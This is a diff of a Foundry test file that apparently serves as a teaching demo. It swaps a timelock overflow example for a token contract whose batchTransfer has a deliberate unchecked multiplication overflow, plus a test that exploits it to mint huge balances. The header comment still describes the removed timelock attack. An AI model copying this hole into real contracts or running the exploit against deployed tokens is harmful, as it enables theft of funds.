@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.7.6;
+pragma solidity 0.6.0;
 
 import "forge-std/Test.sol";
 
@@ -21,67 +21,78 @@ Attack caused the TimeLock.lockTime to overflow,
 and was able to withdraw before the 1 week waiting period.
 */
 
-contract TimeLock {
-    mapping(address => uint) public balances;
-    mapping(address => uint) public lockTime;
+library SafeMath {
+  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+    uint256 c = a * b;
+    assert(a == 0 || c / a == b);
+    return c;
+  }
 
-    function deposit() external payable {
-        balances[msg.sender] += msg.value;
-        lockTime[msg.sender] = block.timestamp + 1 weeks;
+  function div(uint256 a, uint256 b) internal pure returns (uint256) {
+    // assert(b > 0); // Solidity automatically throws when dividing by 0
+    uint256 c = a / b;
+    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
+    return c;
+  }
+
+  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+    assert(b <= a);
+    return a - b;
+  }
+
+  function add(uint256 a, uint256 b) internal pure returns (uint256) {
+    uint256 c = a + b;
+    assert(c >= a);
+    return c;
+  }
+}
+
+contract OverflowToken {
+    using SafeMath for uint256;
+    mapping(address => uint256) balances;
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    function balanceOf(address _owner) public view returns (uint256 balance) {
+        return balances[_owner];
     }
 
-    function increaseLockTime(uint _secondsToIncrease) public {
-        lockTime[msg.sender] += _secondsToIncrease; // vulnerable
-    }
+    function batchTransfer(address[] memory _receivers, uint256 _value) public returns (bool) {
+        uint cnt = _receivers.length;
+        uint256 amount = uint256(cnt) * _value;
+        require(cnt > 0 && cnt <= 20);
+        require(_value > 0 && balances[msg.sender] >= amount);
 
-    function withdraw() public {
-        require(balances[msg.sender] > 0, "Insufficient funds");
-        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");
-        uint amount = balances[msg.sender];
-        balances[msg.sender] = 0;
-        (bool sent, ) = msg.sender.call{value: amount}("");
-        require(sent, "Failed to send Ether");
+        balances[msg.sender] = balances[msg.sender].sub(amount);
+        for (uint i = 0; i < cnt; i++) {
+            balances[_receivers[i]] = balances[_receivers[i]].add(_value);
+            emit Transfer(msg.sender, _receivers[i], _value);
+        }
+        return true;
     }
 }
 
 contract ContractTest is Test {
-    TimeLock TimeLockContract;
+    OverflowToken OverflowTokenContract;
     address alice;
     address bob;
     function setUp() public {
-        TimeLockContract = new TimeLock();
+        OverflowTokenContract = new OverflowToken();
         alice = vm.addr(1);
         bob = vm.addr(2);
-        vm.deal(alice, 1 ether);   
-        vm.deal(bob, 1 ether);
     }    
-       
-    function testFailOverflow() public {
-        console.log("Alice balance", alice.balance);
-        console.log("Bob balance", bob.balance);
 
-        console.log("Alice deposit 1 Ether...");
+    function testOverflow() public {
+        console.log("Alice balance", OverflowTokenContract.balanceOf(alice));
+        console.log("Bob balance", OverflowTokenContract.balanceOf(bob));
+
+        console.log("Alice invoke batchTransfer...");
         vm.prank(alice);
-        TimeLockContract.deposit{value: 1 ether}();
-        console.log("Alice balance", alice.balance);
-
-        console.log("Bob deposit 1 Ether...");
-        vm.startPrank(bob); 
-        TimeLockContract.deposit{value: 1 ether}();
-        console.log("Bob balance", bob.balance);
-
-        // exploit here
-        TimeLockContract.increaseLockTime(
-            type(uint).max + 1 - TimeLockContract.lockTime(bob)
-        );
-
-        console.log("Bob will successfully to withdraw, because the lock time is overflowed");
-        TimeLockContract.withdraw();
-        console.log("Bob balance", bob.balance);
-        vm.stopPrank();
-
-        vm.prank(alice);
-        console.log("Alice will fail to withdraw, because the lock time not expired");
-        TimeLockContract.withdraw();    // expect revert
+        address[] memory receives = new address[](2);
+        receives[0] = address(alice);
+        receives[1] = address(bob);
+        uint256 amount = 2**256/2;
+        OverflowTokenContract.batchTransfer(receives, amount);
+        console.log("Alice balance", OverflowTokenContract.balanceOf(alice));
+        console.log("Bob balance", OverflowTokenContract.balanceOf(bob));
     }
 }
